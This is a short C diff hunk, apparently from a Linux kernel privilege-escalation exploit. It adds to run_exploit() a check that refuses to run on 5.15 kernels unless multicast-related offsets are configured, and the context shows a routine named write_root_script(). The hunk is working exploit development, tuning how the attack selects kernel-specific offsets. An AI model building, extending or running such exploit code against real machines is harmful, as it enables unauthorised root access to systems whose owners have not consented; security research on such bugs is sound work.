@@ -1049,6 +1049,16 @@ int run_exploit(int argc, char **argv) {
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
+  /* the mcast stamp is 5.15's only window over the waiter: its pselect and
+   * tcp frames both stop short of it, so a profile without the constants has
+   * no transport at all */
+  if (strncmp(active_offsets->uname_r, "5.15.", 5) == 0 &&
+      active_offsets->mcast_waiter_off <= 0) {
+    pr_error("5.15 needs the mcast stamp; add mcast_waiter_off, "
+             "mcast_buffer_size and mcast_lock_offset to %s\n",
+             active_offsets->uname_r);
+    return 1;
+  }
 
   log_startup_context();
   init_p0_profile();
